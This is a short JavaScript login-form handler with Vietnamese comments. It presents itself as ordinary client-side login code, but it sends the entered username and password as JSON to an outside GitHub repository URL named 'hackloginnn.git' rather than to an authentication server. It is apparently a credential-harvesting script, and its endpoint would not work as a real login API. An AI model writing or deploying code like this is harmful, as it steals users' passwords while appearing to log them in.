const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async function(event) {
  event.preventDefault(); // Ngăn trang không reload khi submit

  // Lấy giá trị của username và password
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  try {
    // Gửi dữ liệu tới server bằng fetch API
    const response = await fetch('https://github.com/bwm120/hackloginnn.git', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        username: username,
        password: password
      })
    });

    // Kiểm tra xem phản hồi có thành công không
    if (response.ok) {
      const result = await response.json();
      console.log('Đăng nhập thành công:', result);
      // Xử lý kết quả thành công từ server (ví dụ: lưu token, chuyển trang, v.v.)
    } else {
      console.error('Đăng nhập thất bại:', response.status);
      // Xử lý lỗi nếu đăng nhập thất bại
    }
  } catch (error) {
    console.error('Lỗi khi kết nối tới server:', error);
  }
});
